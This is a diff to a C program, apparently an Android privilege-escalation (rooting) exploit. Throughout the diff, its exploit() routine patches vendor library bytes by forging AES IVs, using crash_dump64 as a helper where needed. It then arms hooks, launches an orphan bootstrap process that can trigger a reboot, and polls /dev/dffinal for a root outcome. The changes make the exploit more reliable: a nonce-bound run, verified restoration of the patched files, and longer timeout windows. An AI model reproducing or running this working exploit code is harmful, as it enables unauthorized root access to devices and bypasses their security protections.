@@ -19,8 +19,23 @@
 #include <arpa/inet.h>
 #include "aes256.h"
 #include "status_protocol.h"
+#include "final_status_publish.h"
 #include "elf_parser.h"
 #include "device_version.h"
+
+#define DF_FINAL_PATH "/dev/dffinal"
+/* The 128-bit run nonce is generated here and persisted before the hook is
+ * armed; bootstrap reads it and binds every final token to it. */
+#define DF_FILES_DIR   "/data/user_de/0/df.root/files"
+#define DF_NONCE_PATH  DF_FILES_DIR "/dfinv"
+#define DF_NONCE_TMP   DF_FILES_DIR "/dfinv.tmp"
+#define DF_NONCE_MODE  0644
+/* Budget bounds a wait with no preflight; a REBOOT_PENDING preflight may use a
+ * grace window past that budget, but never past the overall cap. Cleanup runs
+ * once before this extended wait. */
+#define DF_WAIT_BUDGET_MS  70000
+#define DF_WAIT_GRACE_MS   10000
+#define DF_WAIT_OVERALL_MS 85000
 
 static const char kCrashDump[] = "/apex/com.android.runtime/bin/crash_dump64";
 static char    *libcxx_ko_target;
@@ -79,6 +94,7 @@ struct preflight {
     struct restore_record restores[MAX_RESTORE_RECORDS];
     int restore_count;
     int cleanup_failed;
+    int cleanup_done;   /* status_flow_run owns cleanup exactly once */
 };
 
 /* IV = AES256_ECB_DEC(key, old_content) XOR desired
@@ -683,14 +699,45 @@ static int apply_hook_plan(struct preflight *pf, const struct hook_plan *plan) {
                           0, plan->tramp_orig);
 }
 
+/* Read back a restored region for verification. Helper-backed targets need
+ * the crash_dump bridge; the rest can be pread directly. */
+static int read_back_restore(const struct restore_record *r, uint8_t *buf)
+{
+    int fd;
+    size_t off;
+
+    if (r->use_helper) {
+        for (off = 0; off < r->len; off += 16)
+            if (read_vendor_content((off_t)(r->off + off), buf + off) != 0)
+                return -1;
+        return 0;
+    }
+    fd = open(r->lib, O_RDONLY | O_CLOEXEC);
+    if (fd < 0) return -1;
+    off = 0;
+    while (off < r->len) {
+        ssize_t n = pread(fd, buf + off, r->len - off, (off_t)(r->off + off));
+        if (n < 0 && errno == EINTR) continue;
+        if (n <= 0) { close(fd); return -1; }
+        off += (size_t)n;
+    }
+    close(fd);
+    return 0;
+}
+
 /* Attempt every recorded restore in reverse write order. A helper restore is
- * last so vendor restores that still use crash_dump64 remain possible. */
+ * last so vendor restores that still use crash_dump64 remain possible. Every
+ * successful write is verified by reading the bytes back and comparing them
+ * with the saved originals; a silent restore failure is never reported OK. */
 static int cleanup(struct preflight *pf) {
     int i, failed = 0;
     if (pf == NULL || pf->restore_count == 0) return 0;
     printf("\n=== cleanup ===\n");
     for (i = pf->restore_count - 1; i >= 0; i--) {
         struct restore_record *r = &pf->restores[i];
+        uint8_t *verify;
+        int ok;
+
         printf("restoring %s at 0x%llx (%zu bytes)\n", r->lib,
                (unsigned long long)r->off, r->len);
         /* NULL old_blocks: read the CURRENT (possibly patched) bytes to build
@@ -699,9 +746,24 @@ static int cleanup(struct preflight *pf) {
                            (size_t)r->off, r->use_helper, NULL) != 0) {
             printf("restore FAILED for %s\n", r->lib);
             failed = 1;
-        } else {
-            printf("restore OK for %s\n", r->lib);
+            continue;
         }
+        verify = (uint8_t *)malloc(r->len ? r->len : 1);
+        if (!verify) {
+            printf("VERIFICATION FAILED for %s at 0x%llx: allocation failed\n",
+                   r->lib, (unsigned long long)r->off);
+            failed = 1;
+            continue;
+        }
+        ok = read_back_restore(r, verify);
+        if (ok != 0 || memcmp(verify, r->orig, r->len) != 0) {
+            printf("VERIFICATION FAILED for %s at 0x%llx: restored bytes differ\n",
+                   r->lib, (unsigned long long)r->off);
+            failed = 1;
+        } else {
+            printf("restore OK (verified) for %s\n", r->lib);
+        }
+        free(verify);
     }
     return failed ? -1 : 0;
 }
@@ -848,12 +910,98 @@ static int setup(int argc, char **argv) {
     return 0;
 }
 
+/* ---- Run nonce: generated before the hook, consumed by bootstrap ---- */
+
+/* 128 bits from getrandom(); /dev/urandom is a fallback for kernels where the
+ * syscall is unavailable. Never reuse a zero or predictable nonce. */
+static int generate_nonce(char out[DF_NONCE_CHARS + 1])
+{
+    uint8_t raw[DF_NONCE_BYTES];
+    size_t off = 0;
+    int fd;
+
+    while (off < sizeof(raw)) {
+        ssize_t n = syscall(__NR_getrandom, raw + off, sizeof(raw) - off, 0);
+        if (n < 0 && errno == EINTR) continue;
+        if (n <= 0) break;
+        off += (size_t)n;
+    }
+    if (off != sizeof(raw)) {
+        fd = open("/dev/urandom", O_RDONLY | O_CLOEXEC);
+        if (fd < 0) return -1;
+        off = 0;
+        while (off < sizeof(raw)) {
+            ssize_t n = read(fd, raw + off, sizeof(raw) - off);
+            if (n < 0 && errno == EINTR) continue;
+            if (n <= 0) break;
+            off += (size_t)n;
+        }
+        close(fd);
+        if (off != sizeof(raw)) return -1;
+    }
+    for (size_t i = 0; i < sizeof(raw); i++)
+        snprintf(out + i * 2, 3, "%02x", raw[i]);
+    out[DF_NONCE_CHARS] = '\0';
+    return df_nonce_is_valid(out) ? 0 : -1;
+}
+
+/* Atomic replace: unlink any stale temp, O_EXCL|O_NOFOLLOW create, pin 0644
+ * with fchmod, fsync the inode, rename over dfinv. A partial write never
+ * becomes visible to bootstrap. */
+static int write_nonce_atomic(const char *nonce)
+{
+    size_t off = 0;
+    int fd, dfd;
+
+    unlink(DF_NONCE_TMP);
+    fd = open(DF_NONCE_TMP, O_WRONLY | O_CREAT | O_EXCL | O_NOFOLLOW | O_CLOEXEC,
+              DF_NONCE_MODE);
+    if (fd < 0) {
+        printf("nonce: create %s failed: %s\n", DF_NONCE_TMP, strerror(errno));
+        return -1;
+    }
+    if (fchmod(fd, DF_NONCE_MODE) < 0) {
+        printf("nonce: fchmod failed: %s\n", strerror(errno));
+        close(fd);
+        unlink(DF_NONCE_TMP);
+        return -1;
+    }
+    while (off < DF_NONCE_CHARS) {
+        ssize_t n = write(fd, nonce + off, DF_NONCE_CHARS - off);
+        if (n < 0 && errno == EINTR) continue;
+        if (n <= 0) {
+            printf("nonce: write failed: %s\n", strerror(errno));
+            close(fd);
+            unlink(DF_NONCE_TMP);
+            return -1;
+        }
+        off += (size_t)n;
+    }
+    if (fsync(fd) < 0) {
+        printf("nonce: fsync failed: %s\n", strerror(errno));
+        close(fd);
+        unlink(DF_NONCE_TMP);
+        return -1;
+    }
+    if (close(fd) < 0) {
+        unlink(DF_NONCE_TMP);
+        return -1;
+    }
+    if (rename(DF_NONCE_TMP, DF_NONCE_PATH) < 0) {
+        printf("nonce: rename failed: %s\n", strerror(errno));
+        unlink(DF_NONCE_TMP);
+        return -1;
+    }
+    /* Best effort: make the rename durable as well as the file contents. */
+    dfd = open(DF_FILES_DIR, O_RDONLY | O_DIRECTORY | O_CLOEXEC);
+    if (dfd >= 0) { fsync(dfd); close(dfd); }
+    return 0;
+}
+
 /* ---- Consumer-side status_io operations ----
  * The app only reads the single atomically published /dev/dffinal outcome.
  * Progress markers are logged once each for diagnostics and are NEVER used to
  * derive the result (no marker precedence, no "root verified" claim). */
-#define DF_FINAL_PATH "/dev/dffinal"
-
 static const struct {
     const char *path;
     const char *msg;
@@ -893,10 +1041,9 @@ static void exp_report(void *ctx, const char *msg)
     printf("%s\n", msg);
 }
 
-static int exp_read_final(void *ctx, char *buf, size_t cap)
+static int exp_read_final(void *ctx, char *buf, size_t cap, size_t *out_len)
 {
     size_t i;
-    int fd, n;
     (void)ctx;
 
     for (i = 0; i < sizeof(kProgressMarkers) / sizeof(kProgressMarkers[0]); i++) {
@@ -906,21 +1053,18 @@ static int exp_read_final(void *ctx, char *buf, size_t cap)
         }
     }
 
-    if (!buf || cap == 0) return -1;
-    fd = open(DF_FINAL_PATH, O_RDONLY | O_NOFOLLOW | O_CLOEXEC);
-    if (fd < 0) return -1; /* unavailable: consumer keeps polling */
-    n = (int)read(fd, buf, cap - 1);
-    close(fd);
-    if (n < 0) return -1;
-    buf[n] = '\0';
-    return 0;
+    if (!buf || cap == 0 || !out_len) return -1;
+    /* Strict real-file adapter: O_NOFOLLOW, regular file, bounded exact read.
+     * The protocol parses the exact byte count, so an embedded NUL, a truncation
+     * or extra bytes can never be mistaken for a valid token. */
+    return df_read_final_file(DF_FINAL_PATH, buf, cap, out_len);
 }
 
 /* The consumer never publishes; these are fail-closed no-ops kept so the
  * injected vtable is complete. They are never called on the consumer path. */
-static int exp_publish_final(void *ctx, const char *token)
+static int exp_publish_final(void *ctx, const char *nonce, enum df_outcome outcome)
 {
-    (void)ctx; (void)token; return -1;
+    (void)ctx; (void)nonce; (void)outcome; return -1;
 }
 static int exp_late_load_state(void *ctx)
 {
@@ -934,6 +1078,8 @@ static int exp_wait_child(void *ctx, int timeout_ms)
 static void status_cleanup_cb(void *ctx)
 {
     struct preflight *pf = (struct preflight *)ctx;
+    if (!pf || pf->cleanup_done) return; /* exactly once, even on retries */
+    pf->cleanup_done = 1;
     if (cleanup(pf) < 0) {
         pf->cleanup_failed = 1;
         printf("cleanup: one or more restores failed\n");
@@ -955,44 +1101,59 @@ static int exploit(struct preflight *pf) {
     usleep(500000);
 
     printf("\n=== init  ===\n");
-    createOrphanProcess();
-
+    /* Bind the run before arming the hook: bootstrap refuses to publish (and
+     * refuses to reboot) if it cannot read this exact nonce from dfinv. */
     {
-        struct status_io io;
-        enum df_outcome outcome = DF_OUTCOME_NONE;
-        enum df_wait_result wait;
+        char nonce[DF_NONCE_CHARS + 1];
+        if (generate_nonce(nonce) != 0 || write_nonce_atomic(nonce) != 0) {
+            printf("nonce: cannot persist run nonce; no reboot will be triggered\n");
+            rc = DF_RC_UNKNOWN;
+            goto done;
+        }
+        if (createOrphanProcess() != 0) {
+            rc = DF_RC_UNKNOWN;
+            goto done;
+        }
 
-        memset(&io, 0, sizeof(io));
-        io.now_ms          = exp_now_ms;
-        io.sleep_ms        = exp_sleep_ms;
-        io.read_final      = exp_read_final;
-        io.publish_final   = exp_publish_final;
-        io.late_load_state = exp_late_load_state;
-        io.wait_child      = exp_wait_child;
-        io.report          = exp_report;
+        {
+            struct status_io io;
+            enum df_outcome outcome = DF_OUTCOME_NONE;
+            enum df_wait_result wait;
 
-        /* 70 s budget covers the 60 s late-load wait plus slack. The child
-         * (soft-reboot) wait is 5 s; allow a 10 s grace after ROOT_ONLY so a
-         * refinement arriving near the end of that child wait is still inside
-         * the consumer's window (5 s grace ended exactly at the child's 5 s
-         * deadline and could miss it). The flow releases the patched files
-         * exactly once on observation or timeout, so cleanup is never delayed
-         * until main() returns. */
-        wait = status_flow_run(&io, pf, 70000, 10000, status_cleanup_cb, &outcome);
-        printf("status: %s (rc=%d)\n",
-               wait == DONE ? "final status observed" :
-               wait == TIMEOUT ? "timeout waiting for final status" : "status error",
-               df_outcome_to_rc(outcome));
-        rc = df_outcome_to_rc(outcome);
+            memset(&io, 0, sizeof(io));
+            io.now_ms          = exp_now_ms;
+            io.sleep_ms        = exp_sleep_ms;
+            io.read_final      = exp_read_final;
+            io.publish_final   = exp_publish_final;
+            io.late_load_state = exp_late_load_state;
+            io.wait_child      = exp_wait_child;
+            io.report          = exp_report;
+            io.nonce           = nonce;
+
+            /* 70 s budget covers the 60 s late-load wait plus slack. A
+             * REBOOT_PENDING preflight rebases a 10 s grace window that may run
+             * past the budget, but is capped at 85 s overall. status_flow_run
+             * releases the patched files EXACTLY ONCE before this extended
+             * wait; an unrefined pending is reported as ATTEMPT_UNKNOWN. */
+            wait = status_flow_run(&io, pf, DF_WAIT_BUDGET_MS, DF_WAIT_GRACE_MS,
+                                   DF_WAIT_OVERALL_MS, status_cleanup_cb, &outcome);
+            printf("status: %s (rc=%d)\n",
+                   wait == DONE ? "final status observed" :
+                   wait == TIMEOUT ? "timeout waiting for final status" : "status error",
+                   df_outcome_to_rc(outcome));
+            rc = df_outcome_to_rc(outcome);
+        }
     }
     return rc;
 done:
-    /* No bootstrap was launched (patch failure), so no final status will ever
-     * be published. Release the patched files here rather than waiting out a
-     * 70 s budget with no possible terminal observation. */
-    if (cleanup(pf) < 0) pf->cleanup_failed = 1;
-    printf("patch: ERROR - failed to patch files\n");
-    return 3;
+    /* No bootstrap consumer was launched (patch, nonce or orphan failure), so
+     * no final status will ever be published. Release the patched files here
+     * rather than waiting out a 70 s budget with no possible observation. */
+    if (!pf->cleanup_done) {
+        if (cleanup(pf) < 0) pf->cleanup_failed = 1;
+    }
+    printf("patch: ERROR - exploit stopped before awaiting final status\n");
+    return rc;
 }
 
 int main(int argc, char **argv) {
@@ -1007,10 +1168,11 @@ int main(int argc, char **argv) {
     }
     /* exploit()/status_flow_run() owns cleanup exactly once. */
     rc = exploit(&pf);
-    /* A success outcome is only truthful if every recorded restore worked. */
-    if (rc == 0 && pf.cleanup_failed) {
-        printf("cleanup failure: downgrading success rc 0 to error rc 1\n");
-        rc = 1;
+    /* A failed restore must be visible on EVERY result code, not just rc 0:
+     * set the recovery-failed bit rather than rewriting the status outcome. */
+    if (pf.cleanup_failed) {
+        printf("cleanup failure: setting recovery-failed bit (64) on rc %d\n", rc);
+        rc |= DF_RC_RECOVERY_FAILED_BIT;
     }
     clear_secret(g_aes_key, sizeof(g_aes_key));
     return rc;
